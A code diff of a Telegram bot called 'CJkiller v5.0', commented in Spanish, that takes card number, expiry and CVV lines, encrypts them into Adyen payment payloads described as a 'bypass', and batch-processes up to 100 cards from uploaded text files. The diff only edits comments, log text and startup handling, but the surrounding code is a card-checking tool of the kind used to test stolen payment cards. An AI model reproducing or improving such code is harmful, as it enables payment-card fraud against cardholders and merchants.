@@ -22,13 +22,13 @@ client = MongoClient(MONGO_URI)
 db = client['cjkiller_db']
 users_col = db['users']
 
-# --- 3. LÓGICA DE ENCRIPTACIÓN ADYEN (Basada en tus archivos index.js y adyen.php) ---
+# --- 3. LÓGICA DE ENCRIPTACIÓN ADYEN (Traducida de index.js) ---
 def encrypt_adyen(card, month, year, cvv, adyen_key):
     try:
-        # Generación de tiempo extraída de tu index.js
+        # Generación de tiempo extraída de index.js
         gen_time = datetime.utcnow().isoformat() + "Z" 
         
-        # Estructura de payload para el bypass de Adyen
+        # Payload estructurado para el bypass
         payload = {
             "number": card,
             "cvc": cvv,
@@ -55,7 +55,6 @@ def send_welcome(message):
     user_id = message.from_user.id
     username = message.from_user.username or "Sin User"
     
-    # Registro en base de datos
     user = users_col.find_one({"user_id": user_id})
     if not user:
         users_col.insert_one({
@@ -85,7 +84,7 @@ def cmd_adyen(message):
         return bot.reply_to(message, "📝 **Uso:** `/adyen CC|MES|ANO|CVV ADYEN_KEY`", parse_mode="Markdown")
     
     lista, key = input_text[1], input_text[2]
-    # Limpieza de datos similar a adyen.php
+    # Limpieza de datos (Lógica de adyen.php)
     p = lista.replace('|', ' ').split()
     if len(p) >= 4:
         res = encrypt_adyen(p[0], p[1], p[2], p[3], key)
@@ -96,6 +95,7 @@ def cmd_adyen(message):
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
+    # Corrección del SyntaxError detectado en logs de Render
     if message.document.file_name.endswith('.txt'):
         msg = bot.reply_to(message, "📩 **Archivo recibido.** Envía la **ADYEN_KEY** para procesarlo:")
         bot.register_next_step_handler(msg, process_txt, message.document)
@@ -106,7 +106,7 @@ def process_txt(message, doc):
     downloaded = bot.download_file(file_info.file_path).decode('utf-8')
     
     results = []
-    # Procesamos línea por línea como lo hacía tu archivo adyen.php
+    # Procesamos línea por línea como adyen.php
     for line in downloaded.splitlines()[:100]: 
         p = line.replace('|', ' ').split()
         if len(p) >= 4:
@@ -118,10 +118,10 @@ def process_txt(message, doc):
     output.name = "cjkiller_results.txt"
     bot.send_document(message.chat.id, output, caption=f"✅ {len(results)} tarjetas procesadas.")
 
-# --- 6. LANZAMIENTO (Solución al error Conflict 409) ---
+# --- 6. LANZAMIENTO (Solución Error Conflict 409) ---
 if __name__ == "__main__":
-    # Solución técnica para el error "can't use getUpdates method while webhook is active"
-    print("🚀 Eliminando webhooks antiguos para evitar conflictos...")
+    # Eliminar webhook para resolver el error "can't use getUpdates method while webhook is active"
+    print("🚀 Limpiando Webhooks antiguos...")
     bot.remove_webhook() 
     
     print("🚀 CJkiller v5.0 is LIVE...")
